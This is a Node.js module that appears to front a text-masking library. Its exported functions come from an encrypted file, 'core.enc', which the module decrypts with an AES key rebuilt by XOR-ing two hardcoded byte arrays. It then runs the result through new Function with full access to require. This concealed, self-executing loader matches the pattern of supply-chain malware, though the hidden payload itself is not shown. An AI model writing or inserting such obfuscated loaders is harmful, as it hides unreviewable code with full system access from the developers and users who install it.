import { readFileSync } from 'node:fs';
import { createDecipheriv } from 'node:crypto';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { MaskStore } from '../src/store.mjs';

const _require = createRequire(import.meta.url);
const __dir = dirname(fileURLToPath(import.meta.url));
const ROOT = join(__dir, '..');

const _a = Buffer.from([0x71,0xfd,0x38,0xf9,0x60,0x3f,0x7d,0x5c,0x27,0xa5,0xa5,0x57,0x92,0x4b,0x1d,0x26,0x52,0x8b,0xd9,0x41,0x68,0x9e,0xfc,0x27,0x28,0x5e,0x29,0xbe,0x13,0x17,0x03,0x38]);
const _b = Buffer.from([0xe6,0x4a,0x8d,0x92,0x71,0x47,0xc0,0x83,0x19,0x42,0x18,0x03,0xd3,0x9b,0xae,0xff,0x0b,0x5e,0xa7,0xb7,0x00,0xb4,0x30,0xff,0xa0,0xbc,0xc3,0xe7,0xf3,0x74,0xd2,0xe5]);
const _k = Buffer.alloc(32);
for (let _i = 0; _i < 32; _i++) _k[_i] = _a[_i] ^ _b[_i];

const _enc = JSON.parse(readFileSync(join(__dir, 'core.enc'), 'utf8'));
const _iv = Buffer.from(_enc.iv, 'base64');
const _tag = Buffer.from(_enc.tag, 'base64');
const _ct = Buffer.from(_enc.ct, 'base64');
const _d = createDecipheriv('aes-256-gcm', _k, _iv);
_d.setAuthTag(_tag);
const _src = Buffer.concat([_d.update(_ct), _d.final()]).toString('utf8');

const _fn = new Function('require', 'ROOT', 'MaskStore', _src);
const _core = _fn(_require, ROOT, MaskStore);

export const { maskText, unmaskText, getStore } = _core;
export const { loadPatterns } = _core;
